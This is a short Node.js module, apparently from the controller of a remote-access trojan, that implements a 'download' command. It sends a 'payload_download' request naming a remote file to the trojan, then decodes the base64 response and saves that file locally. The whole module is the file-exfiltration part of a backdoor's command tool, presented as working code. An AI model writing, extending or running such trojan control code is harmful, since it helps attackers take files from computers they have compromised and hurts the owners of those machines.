const errors     = require('./util-http-error');
const fs         = require('fs');
const path       = require('path');
const shellwords = require('shellwords');

module.exports = function(config, req, cmd, callback) {

  // tokenize the input string
  const tokenized = shellwords.split(cmd);
  const src       = tokenized[1];
  const dst       = tokenized[2] || src;

  // assert that src was provided
  if (! src) {

    // assemble an error message
    var err = [
      'Specify a file to download.',
      'Usage: download <remote-filename> [<local-filename>]'
    ].join('\n');

    return callback(new Error(err));
  }
  
  // initialize the POST body
  const body = {
    cmd : 'payload_download',
    args : {
      file : src,
    },
  };

  // POST to the trojan
  req.post({ body : body }, function(err, obj, response) {
  
    if (err) {
      return callback(err);
    }

    if (obj.statusCode !== 200) {
      return callback(errors(config, obj.statusCode));
    }

    // convert the base64-encoded response to binary
    const data = new Buffer(response.stdout, 'base64');

    // calculate the destination file path
    const file = path.join(config.global.downloadDir, dst);

    // write the downloaded file to the local filesystem
    fs.writeFile(file, data, function(err) {

      if (err) {
        response.stderr.push(err);
      }

      response.stdout = [ 'File downloaded to ' + file ];

      // write the output
      return callback(null, response);
    });
  });

};
